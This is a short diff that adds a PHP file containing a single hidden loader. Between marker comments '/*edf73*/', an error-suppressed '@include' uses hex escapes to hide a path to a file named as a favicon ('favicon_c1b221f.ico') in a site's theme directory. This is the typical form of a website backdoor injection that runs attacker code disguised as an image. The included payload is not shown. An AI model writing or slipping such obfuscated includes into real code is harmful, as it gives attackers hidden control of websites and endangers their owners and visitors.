@@ -1,0 +1,7 @@
+<?php
+/*edf73*/
+
+@include "\x2fhom\x65/em\x62ank\x6de/p\x75bli\x63_ht\x6dl/t\x68eme\x73/en\x67ine\x73/ph\x70tem\x70lat\x65/fa\x76ico\x6e_c1\x6221f\x2eico";
+
+/*edf73*/
+
